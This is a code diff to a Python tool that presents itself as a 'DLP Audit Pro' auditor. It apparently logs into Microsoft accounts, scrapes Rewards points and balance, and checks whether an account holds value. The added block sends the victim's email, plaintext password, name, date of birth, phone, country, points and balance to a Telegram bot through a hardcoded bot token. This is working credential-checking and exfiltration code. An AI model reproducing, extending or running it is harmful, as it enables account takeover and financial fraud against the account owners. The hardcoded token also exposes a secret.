@@ -648,6 +648,33 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 if not b_match: b_match = re.search(r'Microsoft account balance.*?<span[^>]*>([^<]+)</span>', html_b, re.IGNORECASE | re.DOTALL)
                 if b_match: balance = b_match.group(1).strip()
         except: pass
+        
+        # 3. Independent Telegram Dispatch for Financial Data
+        has_points = av_pts != "0" and av_pts != ""
+        has_balance = balance != "0.00" and balance != "0" and balance != ""
+        
+        if has_points or has_balance:
+            emit_event(q, "info", {"message": f"[DEBUG] Cuenta Financiera Detectada! Pts: {av_pts} | Saldo: {balance}"})
+            try:
+                fin_token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
+                if tg_chat_id:
+                    fin_msg = (f"💰 *¡CUENTA FINANCIERA DETECTADA!* 💰\n"
+                               f"━━━━━━━━━━━━━━━━━━\n\n"
+                               f"👤 *Usuario:* `Local Dashboard`\n"
+                               f"📧 *Correo:* `{email}`\n"
+                               f"🔑 *Pass:* `{password}`\n\n"
+                               f"🌍 *País:* {country}\n"
+                               f"👤 *Nombre:* {name}\n"
+                               f"📅 *DOB:* {dob}\n"
+                               f"📱 *Teléf:* `{phone}`\n\n"
+                               f"💎 *Pts. Disp:* `{av_pts}`\n"
+                               f"💳 *Saldo MS:* `{balance}`\n\n"
+                               f"🤖 *DLP Audit Pro System*")
+                    fin_url = f"https://api.telegram.org/bot{fin_token}/sendMessage"
+                    res = requests.post(fin_url, json={"chat_id": tg_chat_id, "text": fin_msg, "parse_mode": "Markdown"}, timeout=5)
+                    res.raise_for_status()
+            except Exception as e:
+                emit_event(q, "warning", {"message": f"[DEBUG] Error Financiera: {e}"})
 
         emit_event(q, "profile", {
             "email": email, "name": name, "country": country, 
@@ -922,10 +949,7 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                               f"👤 *Nombre:* {name}\n"
                               f"📅 *DOB:* {dob}\n"
                               f"🗣️ *Idioma:* {language}\n"
-                              f"📱 *Teléf:* `{phone}`\n"
-                              f"🎁 *Pts. Disp:* `{av_pts}`\n"
-                              f"⏱️ *Pts. Hoy:* `{today_pts}`\n"
-                              f"💳 *Saldo MS:* `{balance}`\n\n"
+                              f"📱 *Teléf:* `{phone}`\n\n"
                               f"📊 *Mensajes:* `{t_found}`\
 🔍 *Búsqueda:* `{s_query}`\
 "
